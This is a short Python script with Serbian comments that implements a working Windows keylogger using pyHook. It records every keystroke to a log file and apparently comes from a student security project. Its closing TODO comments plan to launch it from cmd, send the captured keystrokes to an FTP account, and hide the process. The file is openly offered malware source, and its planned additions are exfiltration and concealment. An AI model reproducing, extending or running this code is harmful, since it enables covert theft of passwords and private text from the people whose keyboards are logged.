import pyHook, pythoncom
import logging

# Putanja do dumpa, samo za test
file_log = 'C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\sigurnost\\log.txt'

# Funkcija koja se poziva svaki put kada se pritisne dugme
def keyPressed(event):
    # Konfiguracija logovanja, biramo filename, level i format cuvanja
    logging.basicConfig(filename = file_log, level = logging.DEBUG, format='%(message)s')
    # Uzimamo karakter, i na svakih 10 karaktera logujemo u fajl
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

#Potreban objekat pyHooka da povezemo tastaturu
obj = pyHook.HookManager()
#Pozivam funkciju na svako dugme
obj.KeyDown = keyPressed
obj.HookKeyboard()
#Prosledjuj logove
pythoncom.PumpMessages()

# 1. UBACITI POKRETANJE IZ CMDA KROZ SKRIPTUivana zecevic
# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA FTP ACCOUNT
# 3. MOZDA SKONTATI KAKO PRIKRITI PROCES